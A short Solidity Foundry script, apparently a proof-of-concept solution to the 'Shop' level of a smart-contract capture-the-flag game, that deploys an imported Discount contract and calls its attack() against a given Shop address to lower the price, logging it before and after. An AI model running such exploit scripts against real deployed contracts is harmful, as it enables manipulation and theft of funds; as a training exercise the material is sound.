// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {Discount} from "../src/21_Shop.sol";

interface IShop {
    function price() external view returns (uint256);
}

contract PoC is Script {
    address private immutable shop = 0xb6fD536610887837a3452Ac249432bF9eF129e3a; // Replace with your Shop instance

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        console2.log("Initial price: ", IShop(shop).price());

        Discount discount = new Discount(shop);
        discount.attack();

        console2.log("Discounted price: ", IShop(shop).price());

        vm.stopBroadcast();
    }
}
